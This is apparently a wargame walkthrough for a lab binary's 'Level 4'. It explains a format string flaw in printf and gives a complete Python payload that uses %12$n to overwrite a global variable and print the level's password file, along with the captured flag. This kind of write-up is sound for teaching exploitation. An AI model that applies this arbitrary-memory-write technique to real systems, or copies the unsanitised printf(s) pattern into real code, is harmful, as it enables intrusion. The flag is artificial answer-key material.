# Level 4 Walkthrough

## Binary Overview

The binary is vulnerable to a format string attack because it passes user input directly to `printf` as a format string
instead of as a plain text string. As in the previous level, this allows us to write to arbitrary memory locations. On
the other hand, we see that if the value of the global variable `m` is 0x1025544, the contents of the `.pass` file will
be shown. Therefore, we are going to use a format string attack to overwrite the value of `m` with 0x1025544 and then
read the `.pass` file.

## Program Flow
`main` simply calls `n()`. The `n` function:
```asm
0x08048457 <n>:   push  ebp
                  mov   ebp, esp
                  sub   esp, 0x218
                  call  fgets(buf, 0x200, stdin)
                  call  p(buf)                ; vulnerable printf
                  mov   eax, ds:0x8049810     ; global m
                  cmp   eax, 0x1025544        ; 16930116 decimal
                  jne   cleanup
                  call  system("/bin/cat /home/user/level5/.pass")
```
Helper `p()` is simply:
```c
p(char *s) {
  printf(s);   // attacker-controlled format string
}
```

## Mapping the Stack
To figure out which positional specifier references our buffer:
```bash
$ python3 -c 'print("AAAA" + "%X " * 50)' | ./level4
AAAAB7FF26B0 BFFFF694 ... 41414141 25205825 ...
```
The twelfth argument shows `0x41414141`, meaning `%12$n` writes through the pointer we place at the start.

## Payload Design
Goal: write the integer `0x1025544` (16930116 decimal) into `0x8049810`.

Steps:
1. Prefix payload with the little-endian address:
   ```python
   addr = struct.pack("<I", 0x8049810)
   ```
2. Print enough characters so that when `%12$n` triggers, the byte counter equals `16930116`. Four bytes have already
been output (the address itself), so we format `%16930112d`.
3. Finish with `%12$n`.

Complete example:
```bash
python3 -c 'import struct
addr = struct.pack("<I", 0x8049810)
payload = addr + ("%" + str(16930112) + "d%12$n").encode()
print(payload.decode("latin1"), end="")' | ./level4
```

## Result
```bash
$ ./level4
... (payload sent) ...
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

## Notes
- Because `fgets` includes the newline, make sure the payload accounts for it (e.g., use `printf` without newline or
trim).
- No RELRO means GOT overwrites would also work, but manipulating the comparison variable is the simplest path.

